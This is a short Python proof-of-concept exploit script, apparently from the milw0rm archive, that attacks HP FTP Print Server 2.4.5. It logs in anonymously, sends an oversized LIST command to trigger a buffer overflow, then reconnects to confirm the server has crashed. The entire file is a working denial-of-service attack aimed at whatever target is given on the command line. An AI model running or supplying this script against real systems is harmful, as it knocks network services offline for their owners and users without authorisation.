#!/usr/bin/python

import sys
from ftplib import FTP

print "Hewlett-Packard FTP Print Server Version 2.4.5 Buffer Overflow (POC)"
print "Copyright (c) Joxean Koret"
print

if len(sys.argv) == 1:
    print "Usage: %s <target>" % sys.argv[0]
    sys.exit(0)

target = sys.argv[1]

print "[+] Running attack against " + target

try:
    ftp = FTP(target)
except:
    print "[!] Can't connect to target", target, ".", sys.exc_info()[1]
    sys.exit(0)
try:
    msg = ftp.login() # Login anonymously
    print msg
except:
    print "[!] Error logging anonymously.",sys.exc_info()[1]
    sys.exit(0)

buf = "./A"
iMax = 9

for i in range(iMax):
    buf += buf

print "[+] Sending buffer of",len(buf[0:3000]),"byte(s) ... "

try:
    print "[+] Please, note that sometimes your connection will not be dropped. "
    ftp.retrlines("LIST " + buf[0:3000])
    print "[!] Exploit doesn't work :("
    print
    sys.exit(0)
except:
    print "[+] Apparently exploit works. Verifying ... "
    print sys.exc_info()[1]

ftp2 = FTP(target)

try:
    msg = ftp2.login()
    print "[!] No, it doesn't work :( "
    print
    print msg
    sys.exit(0)
except:
    print "[+] Yes, it works."
    print sys.exc_info()[1]

# milw0rm.com [2006-12-19]